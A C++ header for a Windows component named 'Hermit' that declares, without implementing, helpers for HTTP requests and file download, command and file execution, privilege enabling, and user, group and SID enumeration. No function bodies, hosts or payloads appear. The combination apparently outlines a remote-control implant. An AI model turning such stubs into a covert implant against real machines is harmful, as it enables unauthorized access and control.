#ifndef HERMIT_CORE_SYSTEM_HPP
#define HERMIT_CORE_SYSTEM_HPP

#include <windows.h>
#include <winhttp.h>
#include <fstream>
#include <iterator>
#include <lm.h>
#include <sddl.h>
#include <sstream>
#include <string>
#include <strsafe.h>
#include <vector>
#include "core/macros.hpp"
#include "core/stdout.hpp"
#include "core/utils.hpp"

namespace System::Arch
{
    std::wstring GetName(WORD wProcessorArchitecture);
}

namespace System::Env
{
    std::wstring GetStrings(const std::wstring& envVar);
}

namespace System::Fs
{
    VOID CALLBACK FileIOCompletionRoutine(
        DWORD dwErrorCode,
        DWORD dwNumberOfBytesTransfered,
        LPOVERLAPPED lpOverlapped
    );


    struct MyFileData {
    LPVOID lpData;
    DWORD dwDataSize;
    };

    std::wstring GetAbsolutePath(const std::wstring& wPath);
    std::vector<std::wstring> GetFilesInDirectory(const std::wstring& wDirPath, BOOL bRecurse);
    std::vector<char> ReadBytesFromFile(const std::wstring& wFilePath);
    BOOL MyWriteFile(const std::wstring& wFilePath, LPCVOID lpData, DWORD dwDataSize);
}

namespace System::Group
{
    std::vector<std::wstring> GetAllGroups();
}

namespace System::Http
{
    VOID WinHttpCloseHandles(
        HINTERNET hSession,
        HINTERNET hConnect,
        HINTERNET hRequest
    );

    struct WinHttpHandlers {
        HINTERNET hSession;
        HINTERNET hConnect;
    };

    WinHttpHandlers InitRequest(LPCWSTR lpHost, INTERNET_PORT nPort);

    struct WinHttpResponse {
        BOOL bResult;
        HINTERNET hRequest;
        DWORD dwStatusCode;
    };

    WinHttpResponse SendRequest(
        HINTERNET hConnect,
        LPCWSTR lpHost,
        INTERNET_PORT nPort,
        LPCWSTR lpPath,
        LPCWSTR lpMethod,
        LPCWSTR lpHeaders,
        LPVOID lpData,
        DWORD dwDataLength
    );

    std::vector<BYTE> ReadResponseBytes(HINTERNET hRequest);
    std::wstring ReadResponseText(HINTERNET hRequest);
    BOOL WriteResponseData(HINTERNET hRequest, const std::wstring& outFile);
    BOOL DownloadFile(
        HINTERNET hConnect,
        LPCWSTR lpHost,
        INTERNET_PORT nPort,
        LPCWSTR lpPath,
        const std::wstring& wSrc,
        const std::wstring& wDest
    );
}

namespace System::Priv
{
    BOOL CheckPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege);
    BOOL SetPrivilege(
        HANDLE hToken,
        LPCTSTR lpszPrivilege,
        BOOL bEnablePrivilege
    );
}

namespace System::Process
{
    std::wstring ExecuteCmd(const std::wstring& cmd);
    BOOL ExecuteFile(const std::wstring& filePath);
}

namespace System::User
{
    std::wstring GetAccountName(); // retrieves computer name and username.
    std::wstring GetSID();
    std::vector<std::wstring> GetAllUsers();
}

#endif // HERMIT_CORE_SYSTEM_HPP